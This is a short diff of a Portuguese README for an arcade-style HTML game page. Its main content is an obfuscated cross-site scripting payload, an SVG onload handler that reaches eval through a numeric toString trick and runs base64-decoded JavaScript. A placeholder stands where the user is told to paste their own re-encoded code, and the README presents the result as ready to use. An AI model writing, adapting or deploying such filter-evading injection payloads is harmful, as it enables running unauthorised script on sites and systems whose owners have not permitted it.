@@ -19,6 +19,6 @@ Uma simples página em html  estilo fliperama feita para jogar  alguns dos games
 Após isso, refaça o encode desse código js e cole o resultado aqui
  
  
- ><svg/onload=window[490837..toString(1<<5)](atob('resultado_do_segundo_base64_aqui'))>xui.vm
+><svg/onload=window[490837..toString(1<<5)](atob('resultado_do_segundo_base64_aqui'))>xui.vm
  
  e estará pronto para ser usado :)
